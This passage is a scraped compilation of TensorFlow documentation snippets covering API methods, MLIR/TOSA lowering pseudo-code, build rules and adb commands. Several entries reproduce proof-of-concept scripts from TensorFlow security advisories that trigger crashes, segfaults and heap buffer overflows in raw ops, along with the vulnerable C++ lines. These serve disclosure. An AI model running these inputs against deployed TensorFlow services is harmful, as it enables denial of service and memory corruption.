  do {                                                    \
    if (!TF_PREDICT_TRUE(EXP)) {                          \
      CheckNotInComputeAsync((CTX), "OP_REQUIRES_ASYNC"); \
      (CTX)->CtxFailure(__FILE__, __LINE__, (STATUS));    \
      return;                                             \
    }                                                     \
  } while (0)
```

----------------------------------------

TITLE: Access BoundingBoxProperties Index Element Python
DESCRIPTION: Accesses an element from the 'index' vector within the bounding box properties by its index `j`. Returns the value of the element at the specified position.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/BoundingBoxProperties.md#_snippet_4

LANGUAGE: Python
CODE:
```
Index(
    j
)
```

----------------------------------------

TITLE: Initializing from Existing Object Python
DESCRIPTION: This class method initializes a new instance of `SentencePieceTokenizerOptionsT` by copying data from an existing object instance. It accepts an object, presumably of a compatible type, and populates the new instance with the same values. This is useful for creating copies or transforming objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsT.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
InitFromObj(
    sentencePieceTokenizerOptions
)
```

----------------------------------------

TITLE: Compute 32-bit Scale Multiplier and Shift - Pseudo-code (C++)
DESCRIPTION: Computes a 32-bit integer multiplier and shift values from a float64 scale factor, suitable for TOSA quantized operations. It uses `std::frexp` to decompose the float scale and then rounds and adjusts the mantissa and exponent to fit into the required integer format, ensuring the multiplier is within `int32` limits and the shift is positive.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_3

LANGUAGE: Pseudo-code (C++)
CODE:
```
void compute_scale_32(float64 scale, int32& multiplier, int32& shift)
{
    /* Generates mantissa and shift values where mantissa is in [-1.0,-0.5] or
    [0.5, 1.0] such that
    multiplier = mantissa*2^shift */

    const float64 mantissa = std::frexp(scale, &shift);
    auto shifted_m = std::round(mantissa * (int64(1) << 31));

    assert(shifted_m <= (int64(1) << 31)); // can't be greater that 1.0
    if (shifted_m == (int64(1) << 31)) {
        shifted_m /= 2;
        shift++;
    }
    // TOSA expect right shift to be positive, and embed (1 << 31) into right
    // shift bits
    shift = (-shift) + 31;

    assert(shifted_m <= std::numeric_limits<int32>::max());

    multiplier = static_cast<int32>(shifted_m);

}
```

----------------------------------------

TITLE: Replacing tf.Shape with tf.VariableShape for Replicated Resources in MLIR
DESCRIPTION: This snippet, part of the `-tf-replicate-invariant-op-hoisting` pass, shows how a `tf.Shape` operation acting on the value read from a replicated resource variable (`tf.ReadVariableOp`) is replaced by a `tf.VariableShape` operation acting directly on the resource handle itself. This assumes the variable shape is constant across replicas and allows for hoisting or simplification. It requires the input to be a replicated resource handle.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_38

LANGUAGE: MLIR
CODE:
```
tf_device.replicate([%0, %1] as %ri: tensor<*x!tf_type.resource>) {n = 2 : i32} {
  %2 = "tf.ReadVariableOp"(%ri) : tensor<*x!tf_type.resource> -> tensor<*xi32>
  %3 = "tf.Shape"(%2) : (tensor<*xi32>) -> tensor<?xi32>
  tf_device.return
}
```

LANGUAGE: MLIR
CODE:
```
tf_device.replicate([%0, %1] as %ri: tensor<*x!tf_type.resource>) {n = 2 : i32} {
  %2 = "tf.ReadVariableOp"(%ri) : tensor<*x!tf_type.resource> -> tensor<*xi32>
  %3 = "tf.VariableShape"(%0) : (tensor<*x!tf_type.resource>) -> tensor<?xi32>
  tf_device.return
}
```

----------------------------------------

TITLE: Lowering Fused Activation Op to TOSA (MLIR)
DESCRIPTION: This function lowers fused activation functions (like RELU, RELU6, TANH) to equivalent TOSA operations. It handles both quantized and floating-point input tensors. For quantized tensors, activations are mapped to TOSA CLAMP operations using calculated quantized boundaries. For floating-point tensors, they are mapped to TOSA RELUN, CLAMP, or TANH operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_30

LANGUAGE: MLIR
CODE:
```
Value lower_fused_activation(Value %input, string activation)
{
    bool is_quantized = isa<QuantizedType>(%input.dtype) ? true : false;

    if (is_quantized) {
        if (activation == "NONE") {
            return %input;
        }
        else if (activation == "RELU") {
            int32 quantized_0 = %input.zp;
            int32 quantized_max = %input.storage_max;
            return tosa.CLAMP(%input) {min_int=quantized_0, max_int=quantized_max};
        }
        else if (activation == "RELU6") {
            int32 quantized_0 = %input.zp;
            int32 quantized_6 = %input.zp + (6.0 / %input.scale);
            return tosa.CLAMP(%input) {min_int=quantized_0, max_int=quantized_6};
        }
        else if (activation == "RELU_N1_TO_1") {
            int32 quantized_n1 = %input.zp + (-1.0 / %input.scale);
            int32 quantized_1 = %input.zp + (1.0 / %input.scale);
            return tosa.CLAMP(%input) {min_int=quantized_n1, max_int=quantized_1};
        }
    }
    else {
        if (activation == "NONE") {
            return %input;
        }
        else if (activation == "RELU") {
            return tosa.RELUN(%input) {max_fp=numeric_limit<float32>::max()};
        }
        else if (activation == "RELU6") {
            return tosa.RELUN(%input) {max_fp=6.0};
        }
        else if (activation == "RELU_N1_TO_1") {
            return tosa.CLAMP(%input) {min_fp=-1.0, max_fp=1.0};
        }
        else if (activation == "TANH") {
            return tosa.TANH(%input);
        }
    }
}
```

----------------------------------------

TITLE: Pulling Inference Diff Results Android ADB
DESCRIPTION: After the tool finishes execution on the Android device, this `adb pull` command retrieves the output file containing the evaluation metrics (`inference_diff.txt` in this example) from the device's temporary directory to a specified local directory (`~/accuracy_tool`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/inference_diff/README.md#_snippet_4

LANGUAGE: bash
CODE:
```
adb pull /data/local/tmp/inference_diff.txt ~/accuracy_tool
```

----------------------------------------

TITLE: Loading Bazel Rules for TensorFlow Components
DESCRIPTION: These lines in a Bazel BUILD file load necessary build rules from TensorFlow's build system. `py_strict_library` is used to define Python libraries with strict dependencies, and `tf_py_test` defines TensorFlow-specific Python test targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_10

LANGUAGE: bazel
CODE:
```
load("//third_party/tensorflow:strict.default.bzl", "py_strict_library")
load("//third_party/tensorflow:tensorflow.default.bzl", "tf_py_test")
```

----------------------------------------

TITLE: Execute Object Detection Evaluation on Android - Shell
DESCRIPTION: Runs the evaluation binary on the Android device using ADB shell, providing paths to the model file, ground truth images, ground truth proto, output labels, and specifying the output file path for metrics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/evaluation/tasks/coco_object_detection/README.md#_snippet_7

LANGUAGE: Shell
CODE:
```
adb shell /data/local/tmp/run_eval \
  --model_file=/data/local/tmp/ssd_mobilenet_v1_float.tflite \
  --ground_truth_images_path=/data/local/tmp/coco_validation/images \
  --ground_truth_proto=/data/local/tmp/coco_validation/ground_truth.pb \
  --model_output_labels=/data/local/tmp/labelmap.txt \
  --output_file_path=/data/local/tmp/coco_output.txt
```

----------------------------------------

TITLE: Raised MLIR Subgraphs for CPU Pack and GPU Ops (MLIR)
DESCRIPTION: Two MLIR functions generated by the `Raise Target Subgraphs Pass`, demonstrating how operations annotated for different devices (`CPU` and `GPU`) are grouped into separate functions. `@func_2_CPU_FLOAT` contains the `tfl.pack` operation, while `@func_0_GPU_FLOAT` contains the `tfl.add` and `tfl.mul` sequence. Required input: MLIR with device-annotated ops.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/lite/experimental/tac/README.md#_snippet_6

LANGUAGE: MLIR
CODE:
```
 func private @func_2_CPU_FLOAT(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>) -> tensor<2x1xf32> attributes {tac.device = "CPU", tac.inference_type = "FLOAT", tac.interface_name = "func_2"} {
    %0 = "tfl.pack"(%arg0, %arg1) {axis = 0 : i32, tac.device = "CPU", tac.inference_type = "FLOAT", values_count = 2 : i32} : (tensor<1xf32>, tensor<1xf32>) -> tensor<2x1xf32>
    return %0 : tensor<2x1xf32>
  }

func private @func_0_GPU_FLOAT(%arg0: tensor<1xf32>, %arg1: tensor<1xf32>, %arg2: tensor<1xf32>) -> tensor<1xf32> attributes {tac.device = "GPU", tac.inference_type = "FLOAT", tac.interface_name = "func_0"} {
    %0 = tfl.add %arg0, %arg1 {fused_activation_function = "RELU6", tac.device = "GPU", tac.inference_type = "FLOAT"} : tensor<1xf32>
    %1 = tfl.mul %0, %arg2 {fused_activation_function = "RELU6", tac.device = "GPU", tac.inference_type = "FLOAT"} : tensor<1xf32>
    return %1 : tensor<1xf32>
  }
```

----------------------------------------

TITLE: Accessing Default Score - Python
DESCRIPTION: This method likely accesses or provides a default score value defined within the `ScoreCalibrationOptions` object. It is called on an instance of the class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ScoreCalibrationOptions.md#_snippet_0

LANGUAGE: python
CODE:
```
DefaultScore()

```

----------------------------------------

TITLE: Colocating TF Split Operation MLIR
DESCRIPTION: Example showing how the `-tf-tpu-colocate-splits` pass in MLIR sets the `_class` attribute on a `tf.Split` operation (`tf_executor.island wraps "tf.Split"`) to match the `_class` attribute of its predecessor (`tf.IteratorGetNext`), ensuring they are colocated.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_52

LANGUAGE: mlir
CODE:
```
%outputs1:2, %control1 = tf_executor.island wraps "tf.IteratorGetNext"(%arg)
  {_class = ["loc:@dataset_iterator_1"]}
%outputs2:2, %control2 = tf_executor.island wraps "tf.Split"(%outputs0, %outputs1#1)
  {_class = ["loc:@dataset_iterator_1"], num_split = 2 : i32}
```

----------------------------------------

TITLE: Cloning TensorFlow Examples Repository (Shell)
DESCRIPTION: Clones the complete TensorFlow examples GitHub repository to your local machine. This command downloads all files and history from the specified URL. It is the first step in obtaining the example code for the Android text classification app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_0

LANGUAGE: Shell
CODE:
```
git clone https://github.com/tensorflow/examples.git
```

----------------------------------------

TITLE: Triggering SparseConcat CHECK-fail Vulnerability - Python
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.raw_ops.SparseConcat`. By providing input shapes where the dimensions, when multiplied, cause an integer overflow, the internal `TensorShape` constructor fails a `CHECK`, crashing the program. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-024.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

indices_1 = tf.constant([[514, 514], [514, 514]], dtype=tf.int64)
indices_2 = tf.constant([[514, 530], [599, 877]], dtype=tf.int64)
indices = [indices_1, indices_2]

values_1 = tf.zeros([0], dtype=tf.int64)
values_2 = tf.zeros([0], dtype=tf.int64)
values = [values_1, values_2]

shape_1 = tf.constant([442, 514, 514, 515, 606, 347, 943, 61, 2], dtype=tf.int64)
shape_2 = tf.zeros([9], dtype=tf.int64)
shapes = [shape_1, shape_2]

tf.raw_ops.SparseConcat(indices=indices, values=values, shapes=shapes, concat_dim=2)
```

----------------------------------------

TITLE: Accessing EagerTensor Handle C++
DESCRIPTION: This C++ snippet from `tfe_wrapper.cc` shows where the pybind11 glue code attempts to access a `TFE_TensorHandle` from the input Python object pointer `eager_tensor_pyobject_ptr`. It demonstrates the assumption that the input `PyObject` is a valid `EagerTensor`, which is the root cause of the vulnerability when a non-tensor object is passed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-023.md#_snippet_0

LANGUAGE: C++
CODE:
```
    TFE_TensorHandle* thandle = EagerTensor_Handle(eager_tensor_pyobject_ptr);

```

----------------------------------------

TITLE: Adding mlir-hlo-opt Executable Target (CMake)
DESCRIPTION: Creates an executable target named `mlir-hlo-opt` from the primary source file `mlir-hlo-opt.cc`. It specifies a build dependency on `MLIRMhloPassIncGen`, which ensures that generated code or headers necessary for the tool are produced before the executable is compiled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/mlir-hlo-opt/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_llvm_executable(mlir-hlo-opt mlir-hlo-opt.cc
  DEPENDS
        MLIRMhloPassIncGen
)
```

----------------------------------------

TITLE: Defining ATAN Kernel Functions and Registration C++
DESCRIPTION: Defines the core logic for a custom ATAN operator in TensorFlow Lite using C++. Includes `AtanPrepare` to handle tensor sizing based on input, `AtanEval` to perform the element-wise arctangent calculation on float data, and `AtanOpRegistrationExternal` to create and return the `TfLiteOperator` registration object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_custom.md#_snippet_13

LANGUAGE: C++
CODE:
```
namespace atan_op {
  namespace {
    TfLiteStatus AtanPrepare(TfLiteOpaqueContext* context, TfLiteOpaqueNode* node) {
      TF_LITE_OPAQUE_ENSURE_EQ(context, TfLiteOpaqueNodeNumInputs(node), 1);
      TF_LITE_OPAQUE_ENSURE_EQ(context, TfLiteOpaqueNodeNumOutputs(node), 1);

      const TfLiteOpaqueTensor* input = TfLiteOpaqueNodeGetInput(context, node, 0);
      TfLiteOpaqueTensor* output = TfLiteOpaqueNodeGetOutput(context, node, 0);

      int num_dims = TfLiteOpaqueTensorNumDimensions(input);

      TfLiteIntArray* output_size = TfLiteIntArrayCreate(num_dims);
      for (int i=0; i < num_dims; ++i) {
        output_size->data[i] = input->dims->data[i];
      }

      return TfLiteOpaqueContextResizeTensor(context, output, output_size);
    }

    TfLiteStatus AtanEval(TfLiteOpaqueContext* context, TfLiteOpaqueNode* node) {
      const TfLiteOpaqueTensor* input = TfLiteOpaqueNodeGetInput(context, node, 0);
      TfLiteOpaqueTensor* output = TfLiteOpaqueNodeGetOutput(context, node, 0);

      float* input_data = static_cast<float*>(TfLiteOpaqueTensorData(input));
      float* output_data = static_cast<float*>(TfLiteOpaqueTensorData(output));

      size_t count = 1;
      int num_dims = TfLiteOpaqueTensorNumDimensions(input);
      for (int i = 0; i < num_dims; ++i) {
        count *= input->dims->data[i];
      }

      for (size_t i = 0; i < count; ++i) {
        output_data[i] = atan(input_data[i]);
      }
      return kTfLiteOk;
    }
  }  // anonymous namespace

  const TfLiteOperator* AtanOpRegistrationExternal() {
    // Singleton instance, intentionally never destroyed.
    static const TfLiteOperator* atan_op = ()[] {
        auto* r = TfLiteOperatorCreate(
            kTfLiteBuiltinCustom, "ATAN", /*version=*/ 1);
        TfLiteOperatorSetPrepare(r, Prepare);
        TfLiteOperatorSetInvoke(r, Eval);
        return r;
      };
    return atan_op;
  }
}  // namespace atan_op
```

----------------------------------------

TITLE: C++ Implementation Detail Causing Conv2D Division by Zero
DESCRIPTION: This C++ snippet from the TensorFlow kernel implementation shows the part of the code responsible for the division by zero vulnerability. It highlights how `patch_depth`, derived from `filter.dim_size(2)`, is used as a divisor in a modulo operation, leading to an error if `patch_depth` is zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-015.md#_snippet_1

LANGUAGE: c++
CODE:
```
  const int64 patch_depth = filter.dim_size(2);
  if (in_depth % patch_depth != 0) { ... }
```

----------------------------------------

TITLE: Checking ImageProperties Buffer Identifier (Python)
DESCRIPTION: Class method to check if a buffer contains the correct identifier for an `ImageProperties` FlatBuffer. Useful for validating the buffer content before parsing. Takes the buffer (`buf`), byte offset, and an optional flag indicating if the buffer is size-prefixed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ImageProperties.md#_snippet_4

LANGUAGE: python
CODE:
```
@classmethod\nImagePropertiesBufferHasIdentifier(\n    buf, offset, size_prefixed=False\n)
```

----------------------------------------

TITLE: Defining XLA LayoutProto Structure - Protocol Buffers
DESCRIPTION: Defines the structure of the `LayoutProto` protocol buffer message used in XLA to describe the memory representation of an array. It includes fields for `minor_to_major` dimension ordering and `tail_padding_alignment_in_elements`. This schema is fundamental to understanding how XLA arranges data in memory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/shapes.md#_snippet_0

LANGUAGE: Protocol Buffers
CODE:
```
message LayoutProto {
  repeated int64 minor_to_major;
  int64 tail_padding_alignment_in_elements;
  ...
}
```

----------------------------------------

TITLE: Initializing SubGraphMetadataT Class (Python)
DESCRIPTION: Constructs a new instance of the `SubGraphMetadataT` class. This class represents metadata for a subgraph within a TFLite model, typically used for storing information about inputs, outputs, and associated properties. It serves as a container for subgraph-specific metadata defined by the schema.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataT.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataT()
```

----------------------------------------

TITLE: Demonstrating Denial of Service via StagePeek in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates how a missing input validation vulnerability in `tf.raw_ops.StagePeek` can lead to a denial of service. By providing an empty tensor with shape [0] as the `index` argument, which the underlying C++ kernel expects to be a scalar, a CHECK failure is triggered, crashing the TensorFlow process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-065.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

index = tf.constant([], shape=[0], dtype=tf.int32)
tf.raw_ops.StagePeek(index=index, dtypes=[tf.int32])
```

----------------------------------------

TITLE: Demonstrating tf.raw_ops.ImmutableConst Segfault in Python
DESCRIPTION: This Python snippet demonstrates the segmentation fault vulnerability in `tf.raw_ops.ImmutableConst`. It imports TensorFlow and attempts to create an immutable constant with `dtype=tf.resource` and an empty shape, which triggers the incorrect memory access.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-108.md#_snippet_0

LANGUAGE: python
CODE:
```
>>> import tensorflow as tf
>>> tf.raw_ops.ImmutableConst(dtype=tf.resource, shape=[],
>>> memory_region_name="/tmp/test.txt")
...
Segmentation fault
```

----------------------------------------

TITLE: Triggering SparseTensorToCSRSparseMatrix Overflow (Python)
DESCRIPTION: This Python snippet provides a minimal example demonstrating how to trigger the heap buffer overflow vulnerability in the `sparse_tensor_to_csr_sparse_matrix` operation by creating a specific `SparseTensor` structure. It uses `tf` and `numpy` to define the tensor's indices, values, and dense shape, which when processed, leads to an out-of-bounds write in the kernel.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-033.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np
from tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops

indices_array = np.array([[0, 0]])
value_array = np.array([0.0], dtype=np.float32)
dense_shape = [0, 0]

st = tf.SparseTensor(indices_array, value_array, dense_shape)

values_tensor = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(
       st.indices, st.values, st.dense_shape)
```

----------------------------------------

TITLE: Lowering Pack (MLIR/TOSA IR)
DESCRIPTION: Lowers a Pack (or Stack) operation to TOSA, combining a list of input tensors along a new axis. It handles rank-0 inputs by reshaping them to rank 1. The tensors are concatenated sequentially using `tosa.CONCAT`, and if the concatenation axis was at the end, a `tosa.TRANSPOSE` is applied to move the new dimension to the front.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_15

LANGUAGE: MLIR/TOSA IR
CODE:
```
Value lower_pack_op(Value %input[], size_t axis)
{
    size_t concat_axis = positive_axis(axis)

    size_t input_tensor_rank = %input[0].rank

    // Convert any rank 0 to rank 1 with reshape
    if (input_tensor_rank == 0) {
       for (int32 i = 0; i < %input.size; i++) {
           %input[i] = tosa.RESHAPE(%input[i], {1})
       }
   }

   vector<size_t> output_shape
   for (int32 i = 0; i < input_tensor_rank; i++) {
       output_shape.push_back(%input[0].shape[i]
   }

   output_shape[concat_axis] = output_shape[concat_axis] * %input.size

   // First pair of tensors
   %concat = tosa.CONCAT(%input[0], %input[1]) {axis=concat_axis}

   // Remaining tensors
   for (int32 i = 2; i < %input.size; i++) {
      %concat = tosa.CONCAT(%concat, %input[i]) {axis=concat_axis}
   }

   if (input_tensor_rank == 0) {
      // No reshape needed for rank 0, already done
      %output = %concat
   } else

      %reshape = tosa.RESHAPE(%concat) {new_shape=output_shape}

      if (concat_axis == input_tensor_rank) {
         // Output shape is [A, B, C, .. n] in this case,
         // need to reshape to [N, A, B, C, ..] with perm [1, 2, 3, .. 0]
         concat_axis = 0

         vector <size_t> perms
         for (int32 i = 0; i < %input[0].rank; i++)
            perms.push_back(i + 1)
         perms.push_back(0)

         %output = tosa.TRANSPOSE(%reshape) {perms=perms}
     } else {
         %output = %reshape
     }

     return %output
}
```

----------------------------------------

TITLE: Initializing CustomMetadataT From Buffer Python
DESCRIPTION: A class method used to initialize a `CustomMetadataT` object from a buffer (`buf`) at a specific position (`pos`). This is typically used for deserialization from a serialized format.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/CustomMetadataT.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
InitFromBuf(
    buf, pos
)
```

----------------------------------------

TITLE: Triggering Segfault in TensorFlow RaggedBincount Python
DESCRIPTION: This Python snippet demonstrates how to reproduce a segmentation fault in TensorFlow's `RaggedBincount` operation. It specifically initializes the 'splits' tensor with a shape of [0] (making it empty), which is the condition that triggers the vulnerability leading to a denial-of-service.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-117.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
binary_output = True
splits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)
values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
size = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)
weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)
tf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)
```

----------------------------------------

TITLE: Running All TFLite Micro Tests with Make | bash
DESCRIPTION: Builds the TensorFlow Lite for Microcontrollers library and executes all available unit tests. This command compiles the entire library and runs all tests defined in the project's Makefiles.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/library.md#_snippet_1

LANGUAGE: bash
CODE:
```
make -f tensorflow/lite/micro/tools/make/Makefile test
```

----------------------------------------

TITLE: Getting Matching Dimension in TFLite (C++)
DESCRIPTION: This C++ utility function is designed to retrieve a dimension size from two `RuntimeShape` objects at specified indices. It includes a `TFLITE_DCHECK_EQ` macro to assert that the dimensions match in debug builds. In release builds, the check is skipped, and the function returns the dimension from the first shape, which can lead to issues if dimensions don't match.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2020-008.md#_snippet_0

LANGUAGE: C++
CODE:
```
// Get common shape dim, DCHECKing that they all agree.
inline int MatchingDim(const RuntimeShape& shape1, int index1,
                       const RuntimeShape& shape2, int index2) {
  TFLITE_DCHECK_EQ(shape1.Dims(index1), shape2.Dims(index2));
  return shape1.Dims(index1);
}
```

----------------------------------------

TITLE: Defining and Calling Basic Generic Async Operation - HLO
DESCRIPTION: This HLO snippet demonstrates the basic structure of a generic asynchronous operation wrapping a single 'op'. It shows the called computation '%async_op' containing the actual operation and the usage of '%async-start' and '%async-done'. The '%async-start' output is a tuple containing the operand, the operation's output, and intermediate state.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/async_ops.md#_snippet_0

LANGUAGE: HLO
CODE:
```
%async_op {
  %param0 = f32[64] parameter(0)
  ROOT %op = f32[32] op(f32[64] %param0), op_specific_attr=âfooâ
}

%async-start = (f32[64], f32[32], s32[]) async-start(f32[64] %operand),
                                         calls=%async_op
%async-done = f32[32] async-done((f32[64], f32[32], s32[]) %async-start)
```

----------------------------------------

TITLE: Lowering XLA GPU Loop to SCF - MLIR
DESCRIPTION: This snippet shows the conversion of the xla_gpu.loop to standard scf.for and scf.if operations. The boundary check implicit in xla_gpu.loop is made explicit using arithmetic comparisons (cmpi, andi) and an scf.if statement, ensuring iterations are skipped if loop induction variables are out of bounds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/emitters.md#_snippet_2

LANGUAGE: MLIR
CODE:
```
%xla_loop = scf.for %vector_index = %c0 to %c4 step %c1 iter_args(%iter = %output) -> (tensor<6x512x4096xbf16>) {
   %2 = arith.cmpi sge, %thread_id_x, %c0 : index
   %3 = arith.cmpi sle, %thread_id_x, %c127 : index
   %4 = arith.andi %2, %3 : i1
   %5 = arith.cmpi sge, %block_id_x, %c0 : index
   %6 = arith.cmpi sle, %block_id_x, %c24575 : index
   %7 = arith.andi %5, %6 : i1
   %inbounds = arith.andi %4, %7 : i1
   %9 = scf.if %inbounds -> (tensor<6x512x4096xbf16>) {
     %dim0 = xla_gpu.apply_indexing #map(%thread_id_x,  %block_id_x)[%vector_index]
     %dim1 = xla_gpu.apply_indexing #map1(%thread_id_x, %block_id_x)[%vector_index]
     %dim2 = xla_gpu.apply_indexing #map2(%thread_id_x, %block_id_x)[%vector_index]
     %extracted = tensor.extract %input[%dim0, %dim1, %dim2] : tensor<6x512x4096xbf16>
     // ... more arithmetic operations
     %29 = arith.mulf %extracted, %28 : bf16
     %inserted = tensor.insert %29 into %iter[%dim0, %dim1, %dim2] : tensor<6x512x4096xbf16>
     scf.yield %inserted : tensor<6x512x4096xbf16>
   } else {
     scf.yield %iter : tensor<6x512x4096xbf16>
   }
   scf.yield %9 : tensor<6x512x4096xbf16>
 }
```

----------------------------------------

TITLE: Accessing Associated Files in ModelMetadata
DESCRIPTION: Retrieves an associated file entry from the model metadata by index. This method requires an index `j` to specify which associated file to retrieve.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_0

LANGUAGE: python
CODE:
```
AssociatedFiles(
    j
)
```

----------------------------------------

TITLE: Demonstrating Vulnerability in TF DatasetToTFRecord - Python
DESCRIPTION: This Python snippet demonstrates how the heap buffer overflow and segmentation fault vulnerability can be triggered in TensorFlow's `tf.raw_ops.ExperimentalDatasetToTFRecord`. It creates a dataset of numeric types, converts it to a variant, and then passes it to the operation, which is expecting strings, exposing the missing type validation issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-124.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

dataset = tf.data.Dataset.range(3)
dataset = tf.data.experimental.to_variant(dataset)
tf.raw_ops.ExperimentalDatasetToTFRecord(
  input_dataset=dataset,
  filename='/tmp/output',
  compression_type='')
```

----------------------------------------

TITLE: Checking FullTypeDef Arguments in C++
DESCRIPTION: This C++ snippet from the `SubstituteForEach` function demonstrates the vulnerable check. It uses `DCHECK_EQ` to assert that the `FullTypeDef` argument `t` has exactly 3 arguments. If the condition is not met, `DCHECK_EQ` causes the program to terminate with an assertion failure, which is the core of the described vulnerability, instead of handling the error gracefully by returning a `Status`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-142.md#_snippet_0

LANGUAGE: cpp
CODE:
```
Status SubstituteForEach(AttrMap& attrs, FullTypeDef& t) {
  DCHECK_EQ(t.args_size(), 3);

  const auto& cont = t.args(0);
  const auto& tmpl = t.args(1);
  const auto& t_var = t.args(2);
}
```

----------------------------------------

TITLE: Setting LLVM Target Definitions Variable (CMake)
DESCRIPTION: Sets the CMake variable `LLVM_TARGET_DEFINITIONS` to the specified TableGen definition file name. This variable is typically used by build systems to locate TableGen files relevant to compiler passes or targets.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/stablehlo_ext/transforms/CMakeLists.txt#_snippet_0

LANGUAGE: CMake
CODE:
```
set(LLVM_TARGET_DEFINITIONS passes.td)
```

----------------------------------------

TITLE: Triggering RaggedBinCount Vulnerability with Python
DESCRIPTION: Demonstrates a proof-of-concept exploit for the TFSA-2021-001 heap buffer overflow in `tf.raw_ops.RaggedBincount`. It uses specific input values, particularly `splits=[0]`, to cause an out-of-bounds read in the underlying C++ kernel implementation, leading to a crash or overflow. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-001.md#_snippet_0

LANGUAGE: Python
CODE:
```
import tensorflow as tf
tf.raw_ops.RaggedBincount(splits=[0], values=[1,1,1,1,1], size=5, weights=[1,2,3,4], binary_output=False)
```

----------------------------------------

TITLE: Generic Async Operation with Intermediate Updates - HLO
DESCRIPTION: This HLO snippet demonstrates the use of `async-update` instructions between `async-start` and `async-done`. The output tuple of `async-start` is passed sequentially through multiple `async-update` steps before finally being consumed by `async-done`. Each `async-update` takes and produces the same tuple structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/async_ops.md#_snippet_2

LANGUAGE: HLO
CODE:
```
%async_op {
  %param0 = f32[64] parameter(0)
